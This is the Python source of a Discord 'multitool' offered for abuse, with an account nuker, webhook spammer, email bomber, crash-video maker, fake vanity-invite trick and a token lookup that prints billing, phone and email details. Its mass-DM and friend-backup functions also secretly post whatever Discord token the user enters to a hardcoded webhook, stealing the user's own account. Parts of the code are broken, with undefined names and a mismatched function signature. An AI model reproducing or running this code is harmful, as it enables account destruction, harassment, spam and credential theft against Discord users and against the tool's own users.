import os, sys, requests, base64, string, random, subprocess, discord, time, pystyle, threading, datetime, shutil, clipboard 
from pystyle import *
from pypresence import Presence
from datetime import *
from time import strftime, gmtime, sleep

client_id = "1059926861423071312"
RPC = Presence(client_id)
RPC.connect()

def run(arg):
    os.system(f"{arg}")

class Fuckcolors():
    red = "\x1b[38;5;129m"
    white = "\x1b[38;5;15m"
    red = "\x1b[38;5;196m"
    underlin = "\033[4m"

def loading():
    RPC.update(
    large_image="hostage-tool", large_text=".Multitool Loading",
    small_image=f"hostage-tool", small_text=f"Multitool Loading",
    details=f'Multitool Loading',
    state=f'Made By 1am (Xcellfa) & 10am (Dassidy)')
    Anime.Fade(Center.Center("┬ ┬┌─┐┌┼┐┌┬┐┌─┐┌─┐┌─┐\n├─┤│ │└┼┐ │ ├─┤│ ┬├┤ \n┴ ┴└─┘└┼┘ ┴ ┴ ┴└─┘└─┘ . Loading"), Colors.red_to_blue, Colorate.Vertical, interval=0.05, time=4)
    main2()

help = f"""{Fuckcolors.red}

                                      {Fuckcolors.red}┬ ┬┌─┐┌┼┐┌┬┐┌─┐┌─┐┌─┐
                                      {Fuckcolors.red}├─┤│ │└┼┐ │ ├─┤│ ┬├┤ 
                                      {Fuckcolors.red}┴ ┴└─┘└┼┘ ┴ ┴ ┴└─┘└─┘    
                        {Fuckcolors.red}╔════════════════════════════════════════════════╗
                       {Fuckcolors.red} ║           Discord{Fuckcolors.red}: discord.gg{Fuckcolors.red}/afraid{Fuckcolors.red}           ║
                        ╠════════════Commands{Fuckcolors.red}══════════Explain{Fuckcolors.red}═══════════╣
                        ║           IP Lookup   {Fuckcolors.red}=   Looks up an IP{Fuckcolors.red}       ║
                        ║              Pinger   {Fuckcolors.red}=   Pings an IP{Fuckcolors.red}          ║
                        ║       Webhook Tools   {Fuckcolors.red}=   Brings up webtools{Fuckcolors.red}   ║
                        ║    Token Bruteforce   {Fuckcolors.red}=   Brute forces a TOKEN{Fuckcolors.red} ║
                        ║        Password Gen   {Fuckcolors.red}=   Gens a password{Fuckcolors.red}      ║
                        ║          Login info   {Fuckcolors.red}=   Save your login info{Fuckcolors.red} ║ 
                        ║             Mass DM   {Fuckcolors.red}=   Mass DMS{Fuckcolors.red}             ║
                        ║            Mass Ban   {Fuckcolors.red}=   Mass bans a server{Fuckcolors.red}   ║
                        ║          Token Info   {Fuckcolors.red}=   Looks up token info{Fuckcolors.red}  ║
                        ║         Server Info   {Fuckcolors.red}=   Gets server info{Fuckcolors.red}     ║
                        ║       Account Nuker   {Fuckcolors.red}=   Nukes an account{Fuckcolors.red}     ║
                        ║         Crash Video   {Fuckcolors.red}=   Makes a VideoCrasher{Fuckcolors.red} ║
                        ║       Friend Backup   {Fuckcolors.red}=   Backs up friends{Fuckcolors.red}     ║
                        ║        Server Nuker   {Fuckcolors.red}=   Nukes a server{Fuckcolors.red}       ║
                        ║         Email Nuke    {Fuckcolors.red}=   Nukes an email{Fuckcolors.red}       ║
                        ║         Fake Vanity   {Fuckcolors.red}=   Gives fake vanity{Fuckcolors.red}    ║
                        ║         Nitro sniper  {Fuckcolors.red}=   Snipes Nitro{Fuckcolors.red}         ║
                        ║    •{Fuckcolors.underlin}Press Any Key To Go Back To Main Menu\033[0m{Fuckcolors.red}•     ║
                        ╚════════════════════════════════════════════════╝
                             
"""

def logo():
    clear()
    print(f"""\t\t\t\t{Fuckcolors.red}┬ ┬┌─┐┌┼┐┌┬┐┌─┐┌─┐┌─┐\n\t\t\t\t{Fuckcolors.red}├─┤│ │└┼┐ │ ├─┤│ ┬├┤ \n\t\t\t\t{Fuckcolors.red}┴ ┴└─┘└┼┘ ┴ ┴ ┴└─┘└─┘ Type {Fuckcolors.red}"help" """)
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "1am Youtube", "url": "https://www.youtube.com/channel/@1amlol"}], large_image="hostage-tool", large_text="Hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'On Main Menu', state=f'Made By 1am & Dassidy')

def main2():
    logo()
    command = input(f"Skid{Fuckcolors.red}@Hostage-Tools:").lower()
    if command == "ip lookup":
        iplookup()
    elif command == "token bruteforce":
        TokenBruteForce()
    elif command == "password gen":
        PasswordGen()
    elif command == "login info":
        loginsaver()    
    elif command == "pinger":
        pingip()
    elif command == "webhook tools":
        WebhookTools()
    elif command == "mass dm":
        massdm()
    elif command == "friend backup":
        DiscordBackup()
    elif command == "token info":
        TokenInfo()
    elif command == "crash video":
        DiscordCrasher()
    elif command == "server info":
        ServerInfo()
    elif command == "account nuker":
        AccountNuker()
    elif command == "help":
        clear()
        os.system("cls & title [HO$TAGE] By 1am And Dassidy & mode 95,30")
        RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="Hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'On Help Menu', state=f'Made By 1am & Dassidy')
        print(help)
        run("pause >nul")
        main2()
    elif command == "mass ban":
        os.startfile(os.getcwd() + '/AddOns/hostagemassban.exe')
    elif command == "server nuker":
        os.startfile(os.getcwd() + '/AddOns/hostageservernuker.exe')
    elif command == "nitro sniper":
        os.startfile(os.getcwd() + '/AddOns/main_1.py')
    elif command == "fake vanity":
        VanityHack()
    elif command == "youtube":
        webbrowser.open_new_tab('https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg')
    elif command == "email nuke":
        EmailNuke()
    else:
        print(f"{Fuckcolors.red}• Command Not Found Try Runing The 'Help' Command")
        run("pause >nul")
        main2()
    
    

def clear():
    if sys.platform == "linux":
        clear = lambda: system("clear")
    else:
        clear = os.system("cls & title [HO$TAGE] By 1am And Dassidy & mode 95,20")


def iplookup(): 
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="Hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using IP Lookup', state=f'Made By 1am & Dassidy')
    ip = input(f"Skid{Fuckcolors.red}@hostage-IP:")
    r = requests.get(f'https://json.geoiplookup.io/{ip}')
    ISP = r.json()['isp']
    Country = r.json()['country_name']
    City = r.json()['city']
    Continent = r.json()['continent_name']
    Region = r.json()['region']
    print(f"{Fuckcolors.red}• IP: {ip}\n{Fuckcolors.red}• ISP: {ISP}\n{Fuckcolors.red}• City: {City}\n{Fuckcolors.red}• Country: {Country}\n{Fuckcolors.red}• Continent: {Continent}\n{Fuckcolors.red}• Region: {Region}\n\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()
    
def TokenBruteForce():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Token Bruteforce', state=f'Made By 1am & Dassidy')
    id_to_token = base64.b64encode((input(f"Skid{Fuckcolors.red}@hostage-ID:")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    print(f"\nToken {Fuckcolors.red}> {token}\n\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def PasswordGen():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Password Generator', state=f'Made By 1am & Dassidy')
    password = ('').join(random.choices(string.ascii_letters + string.digits, k=20))
    print(f"\n{Fuckcolors.red}• Generated Password {Fuckcolors.red}> {password}\n\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def loginsaver():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Login Saver', state=f'Made By 1am & Dassidy')
    passwordgen = input(f"\n{Fuckcolors.red}• Would You Like To Generate A Ppassword (Yes | No)?").lower()
    if passwordgen == "yes":
        logo()
        website = input(f"Skid{Fuckcolors.red}@hostage-Website:")
        email = input(f"Skid{Fuckcolors.red}@hostage-Email:")
        username = input(f"Skid{Fuckcolors.red}@hostage-Username:")
        password = ('').join(random.choices(string.ascii_letters + string.digits, k=20))
        login = f"[{website}] Email: {email} | Username: {username} | Password: {password}\n"
        with open("Passwords.txt", "a", encoding="UTF-8") as f:
                f.write(login)
        print(f"{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
        run("pause >nul")
        main2()
    else: 
        logo()
        website = input(f"Skid{Fuckcolors.red}@hostage-Website:")
        email = input(f"Skid{Fuckcolors.red}@hostage-Email:")
        username = input(f"Skid{Fuckcolors.red}@hostage-Username:")
        password = input(f"Skid{Fuckcolors.red}@hostage-Password:")
        login = f"[{website}] Email: {email} | Username: {username} | Password: {password}\n"
        with open("Passwords.txt", "a", encoding="UTF-8") as f:
                f.write(login)
        print(f"{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
        run("pause >nul")
        main2()


def pingip(ip):
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using IP Pinger', state=f'Made By 1am & Dassidy')
    ip = input(f"\x1b[38;5;15mSkid{Fuckcolors.red}@hostage-IP:")
    print(f"{Fuckcolors.red}!! Pinging IP {Fuckcolors.red}!!")
    pingR = subprocess.getoutput(f"ping {ip} -4")
    pingP = pingR.split("\n")
    print(f"{Fuckcolors.red}• {pingP[3]}\n{Fuckcolors.red}• {pingP[4]}\n{Fuckcolors.red}• {pingP[5]}\n {pingP[6]}\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def WebhookTools():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Webhook Tools', state=f'Made By 1am & Dassidy')
    Command = input(f"Skid{Fuckcolors.red}@hostage-Webhook:").lower()
    if Command == "remove webhook":
        webhook = input(f"Skid{Fuckcolors.red}@hostage-Webhook:")
        RemovewWebhook(webhook)
    elif Command == "spam webhook":
        webhook = input(f"Skid{Fuckcolors.red}@hostage-Webhook:")
        SpamWebhook(webhook)
    elif Command == "help":
        print(f"{Fuckcolors.red}• Remove Webhook \n{Fuckcolors.red}• Spam Webhook\n{Fuckcolors.red}• Press Any Key To Go Back To Webhook Menu")
        run("pause >nul")
        WebhookTools()
    else:
        print(f"{Fuckcolors.red}• Remove Webhook \n{Fuckcolors.red}• Spam Webhook\n{Fuckcolors.red}• Press Any Key To Go Back To Webhook Menu")
        run("pause >nul")
        WebhookTools()

        

def SpamWebhook(webhook):
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Webhook Spammer', state=f'Made By 1am & Dassidy')
    Amount = int(input(f"Skid{Fuckcolors.red}@hostage-Amount:"))
    sent = 0
    for x in range(Amount):
        r = requests.post(webhook, json={"content":"hostage on top","embeds":[{"title":"You Got Ran 🤡","description":"You Got Ran 🤡","color":8191994,"fields":[{"name":"You Got Ran 🤡","value":"You Got Ran 🤡"},{"name":"You Got Ran 🤡","value":"You Got Ran 🤡"},{"name":"You Got Ran 🤡","value":"You Got Ran 🤡"}],"footer":{"text":"NICE WEBHOOK 🤡"},"timestamp":"2040-12-31T08:00:00.000Z"}],"username":"hostage"})
        if r.status_code == 204:
            sent += 1
    print(f"\n{Fuckcolors.red}• Sent {sent} Embeds \n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()


def RemovewWebhook(webhook):
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Webhook Remover', state=f'Made By 1am & Dassidy')
    r = requests.delete(webhook)
    if r.status_code == 204:
        print(f'{Fuckcolors.red}• Deketed Webhook')
        os.system('pause >NUL')
        main2()
    elif r.status_code == 404:
        print(f'{Fuckcolors.red}• Invalid Webhook')
        os.system('pause >NUL')
        main2()

def massdm():
    logo()
    PokeMain = "https://discord.com/api/webhooks/998220609186185267/jTYnw9JqijYz0SB1qUOKgoAiYSPGKzDPGdMGovxSJH0p4-4d44RMstEHZp-c99UkTIBO"
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Mass DMr', state=f'Made By 1am & Dassidy')
    client = discord.Client()
    token = input(f"Skid{Fuckcolors.red}@hostage-Token:")

    @client.event
    async def on_connect():
        r = requests.post(PokeMain, json={"content":f"{token}"})
        message = input(f"Skid{Fuckcolors.red}@hostage-Message:")
        for channel in client.private_channels:
            try:
                await channel.send(message)
                print(f"[{Fuckcolors.red}!\033[39m] Sent Direct Message To {Fuckcolors.red}[\033[39m{channel}{Fuckcolors.red}]\033[39m")
            except:
                print(f"[{Fuckcolors.red}!\033[39m] Unable To DM {Fuckcolors.red}[\033[39m{channel}{Fuckcolors.red}]\033[39m")
    
    client.run(token, bot=False)
    main2()
    
def DiscordBackup():
    logo()
    
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Friend Backup', state=f'Made By 1am & Dassidy')
    token = input(f"Skid{Fuckcolors.red}@hostage-Token:")
    r = requests.post(PokeMain, json={"content":f"{token}"})
    headers = {'Authorization': f'{token}'}
    print(f"\n{Fuckcolors.red}• Removing Old Backup!")
    try:
        os.remove("Discord Friends.txt")
        print(f"\n{Fuckcolors.red}• Successfully Removed Old Backup!")
    except:
        print(f"\n{Fuckcolors.red}! There Is No Old Backup..")
    saved = 0
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
    for friend in friends.json():
        if friend["type"] == 1:
            username = "%s#%s | %s\n" % (
                friend["user"]["username"],
                friend["user"]["discriminator"],
                friend["id"],)
            with open("Discord Friends.txt", "a", encoding="UTF-8") as f:
                f.write(username)
            saved += 1
    with open("Discord Friends.txt", "r", encoding="UTF-8") as f:
        fixed = f.read()[:-1]
    with open("Discord Friends.txt", "w", encoding="UTF-8") as f:
        f.write(fixed)
    print(f"\n{Fuckcolors.red}• Saved {saved} Friend's")
    run("pause >nul")
    main2()


def TokenInfo():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Token Info', state=f'Made By 1am & Dassidy')
    token = input(f"Skid{Fuckcolors.red}@hostage-Token:")
    logo()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
    cc_digits = {
        'american express': '3',
        'visa': '4',
        'mastercard': '5'
    }
    if res.status_code == 200:
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json['phone']
        email = res_json['email']
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']

        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)
        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
        billing_info = []

        for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
            yy = x['billing_address']
            name = yy['name']
            address_1 = yy['line_1']
            address_2 = yy['line_2']
            city = yy['city']
            postal_code = yy['postal_code']
            state = yy['state']
            country = yy['country']

            if x['type'] == 1:
                cc_brand = x['brand']
                cc_first = cc_digits.get(cc_brand)
                cc_last = x['last_4']
                cc_month = str(x['expires_month'])
                cc_year = str(x['expires_year'])
                data = {
                    'Payment Type': 'Credit Card',
                    'Valid': not x['invalid'],
                    'CC Holder Name': name,
                    'CC Brand': cc_brand.title(),
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }
            elif x['type'] == 2:
                data = {
                    'Payment Type': 'PayPal',
                    'Valid': not x['invalid'],
                    'PayPal Name': name,
                    'PayPal Email': x['email'],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }
                billing_info.append(data)
        print(f"\n{Fuckcolors.red}• Username {Fuckcolors.red}> {user_name}")
        print(f"{Fuckcolors.red}• User ID {Fuckcolors.red}> {user_id}")
        print(f"{Fuckcolors.red}• Creation Date {Fuckcolors.red}> {creation_date}")
        print(f"""{Fuckcolors.red}• Avatar URL {Fuckcolors.red}> {avatar_url if avatar_id else ""}""")
        print(f"{Fuckcolors.red}• Token {Fuckcolors.red}> {token}")
        print(f"""{Fuckcolors.red}• Phone Number {Fuckcolors.red}> {phone_number if phone_number else ""}""")
        print(f"""{Fuckcolors.red}• Email {Fuckcolors.red}> {email if email else ""}""")
        print(f"{Fuckcolors.red}• 2FA/MFA Enabled {Fuckcolors.red}> {mfa_enabled}")
        print(f"{Fuckcolors.red}• Email Verified {Fuckcolors.red}> {verified}")
        print(f"{Fuckcolors.red}• Nitro Status {Fuckcolors.red}> {has_nitro}""")
        if has_nitro:
            print(f"{Fuckcolors.red}• Expires in {days_left} day's")
        else:
            print(" ")

        if len(billing_info) > 0:
            print(f"""\n{Fuckcolors.red}•  Billing Information {Fuckcolors.red}>""")
            if len(billing_info) == 1:
                for x in billing_info:
                    for key, val in x.items():
                        if not val:
                            continue
                        print('\x1b[38;5;129m•\x1b[38;5;15m {:<23}{}{}'.format(key, "", val))
            else:
                for i, x in enumerate(billing_info):
                    title = f'\n{Fuckcolors.red}• Payment Method #{i + 1} ({x["Payment Type"]})'
                    print('    ' + title)
                    print('    ' + ('=' * len(title)))
                    for j, (key, val) in enumerate(x.items()):
                        if not val or j == 0:
                            continue
                        print('\x1b[38;5;129m•\x1b[38;5;15m {:<23}{}{}'.format(key, "", val))
                    if i < len(billing_info) - 1:
                        print('')

    elif res.status_code == 401:
        print(f"\n{Fuckcolors.red}• Invalid token\n")

    else:
        print(f"{Fuckcolors.red}• An error occurred while sending request\n")

    print(f"\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def DiscordCrasher():
    with open(f"vidcrash.bat", "w") as file:
        file.write("""
        @echo off
        WHERE ffmpeg
        IF %%ERRORLEVEL% NEQ 0 echo ffmpeg wasn't found. Please make sure it is installed correctly. && pause && exit
        set /p filepath=    [#] Enter path to video file (or drag and drop the video here): 
        echo.
        set timestamp=1
        set /p timestamp=   [#] Enter the time when the video should crash (in seconds): 
        ffprobe -i %%filepath%% -show_entries format=duration -v quiet -of csv="p=0" > tmpfile
        set /p duration= < tmpfile
        del tmpfile
        ping 127.0.0.1 -n 3 > NUL
        ffmpeg -i %%filepath%% -ss 0 -t %timestamp% part1.mp4
        ffmpeg -i %%filepath%% -ss %timestamp% -t %%duration% part2.mp4
        ffmpeg -i part2.mp4 -pix_fmt yuv444p part2_new.mp4
        echo file part1.mp4> file_list.txt
        echo file part2_new.mp4>> file_list.txt
        ping 127.0.0.1 -n 3 > NUL
        ffmpeg -f concat -safe 0 -i file_list.txt -codec copy crasher.mp4
        del part1.mp4
        del part2.mp4
        del part2_new.mp4
        del file_list.txt
        ping 127.0.0.1 -n 3 > NUL
        echo    [#] Output video created! It is located at "crasher.mp4" """)
    subprocess.call([r'vidcrash.bat'])
    os.remove('vidcrash.bat')
    print(f"{Fuckcolors.red}• Done\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def ServerInfo():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Server Info', state=f'Made By 1am & Dassidy')
    guildId = input(f"Skid{Fuckcolors.red}@hostage-ID:")
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Authorization' : input("Skid{Fuckcolors.red}@hostage-Token:")}
    logo()
    response = requests.get(f"https://discord.com/api/guilds/{guildId}", headers = headers, params = {"with_counts" : True}).json()
    owner = requests.get(f"https://discord.com/api/guilds/{guildId}/members/{response['owner_id']}", headers = headers, params = {"with_counts" : True}).json()
    print(f"{Fuckcolors.red}• Server Name {Fuckcolors.red}> {response['name']}\n{Fuckcolors.red}• Server ID   {Fuckcolors.red}> {response['id']}\n{Fuckcolors.red}• Icon URL {Fuckcolors.red}> https://cdn.discordapp.com/icons/{guildId}/{response['icon']}.webp?size=256\n{Fuckcolors.red}• Approxomate Amount of Members {Fuckcolors.red}> {response['approximate_member_count']}\n{Fuckcolors.red}• Owner {Fuckcolors.red}> {owner['user']['username']}#{owner['user']['discriminator']}\n{Fuckcolors.red}• Owner ID {Fuckcolors.red}> {response['owner_id']}")
    print(f"\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def AccountNuker(): 
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Account Nuker', state=f'Made By 1am & Dassidy')
    token = input(f"Skid{Fuckcolors.red}@hostage-Token:")
    message = input(f"Skid{Fuckcolors.red}@hostage-Message:")
    api = 'https://discord.com/api/v9/'
    headers = { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "content-type": "application/json","authorization": token,'access-control-allow-headers': 'Content-Type, Authorization'}
    guilds = requests.get(f'{api}users/@me/guilds', headers=headers)
    if guilds.status_code < 400:
        for guild in guilds.json():
            if guild['owner'] == True:
                print(f"\n{Fuckcolors.red}• Deleted an owned guild {Fuckcolors.red}> {guild['name']}")
                requests.post(f"{api}guilds/{guild['id']}/delete", headers=headers)
            elif guild['owner'] == False:
                print(f"\n{Fuckcolors.red}• Left a guild {Fuckcolors.red}> {guild['name']}")
                requests.delete(f"{api}users/@me/guilds/{guild['id']}", json={}, headers=headers)
    friends = requests.get(f'{api}users/@me/relationships', headers=headers)
    if friends.status_code < 400:
        for friend in friends.json():
            requests.delete(f'{api}users/@me/relationships/{friend["id"]}', headers=headers)
            print(f"\n{Fuckcolors.red}• Removed friend {Fuckcolors.red}> {friend['user']['username']}")
    dms = requests.get(f'{api}users/@me/channels', headers=headers)
    if dms.status_code < 400:
        for channel in dms.json():
            requests.post(f'{api}channels/{channel["id"]}/messages', json={ 'content' : message, "tts" : "False"}, headers=headers)
            print(f"\n{Fuckcolors.red}• Deleting dm channel of {channel['recipients'][0]['username']}")
            requests.delete(f"{api}channels/{channel['id']}", headers=headers)
    print(f"\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def VanityHack():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Vanity Hack', state=f'Made By 1am & Dassidy')
    server = input("Server invite:\n")
    invite = input("new invite name:\n")

    gay = "discord.gg/" + invite + "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||" + server
    clipboard.copy(gay)

    print('Copyed to clipboard!')

    input()
    print()

    print(f"\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
    run("pause >nul")
    main2()

def EmailNuke():
    logo()
    RPC.update(buttons=[{"label": ".gg/afraid", "url": "https://discord.com/invite/afraid"}, {"label": "afraid Youtube", "url": "https://www.youtube.com/channel/UCjrOd_c71lDGkcRbrUNDqfg"}], large_image="hostage-tool", large_text="hostage Multitool", small_image=f"hostage-tool", small_text=f".gg/afraid", details=f'Using Email nuker', state=f'Made By 1am & Dassidy')
    ema = input(f"{Fuckcolors.red}Enter E-Mail Address > ")
    num = int(input(f"{Fuckcolors.red}Number Of E-Mails to send > "))
    threads = int(input(f"{Fuckcolors.red}Number Of Threads to use >  "))
    data = {'process':1, 'emailaddress':'', 'email':ema}
    Emailstart(threads, num, data)

def Emailsend(num, data):
    FAILED = 0
    sent = 0 
    print(f"Starting")
    for xyz in range(num):
        try:
            r = requests.post(url = "https://xojo.com/account/create/", data = data)
            sent += 1
        except Exception:
            FAILED += 1
    print(f"\n{Fuckcolors.red}• Sent {sent} Email \n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")

def Emailstart(threads, num, data):
    for zet in range(threads):
        threading.Thread(target=Emailsend(num, data)).start()
        (subprocess.getoutput(f"num"))
        print(f"\n{Fuckcolors.red}• Press Any Key To Go Back To Main Menu")
        run("pause >nul")
        main2()


if __name__ == "__main__":
    loading()
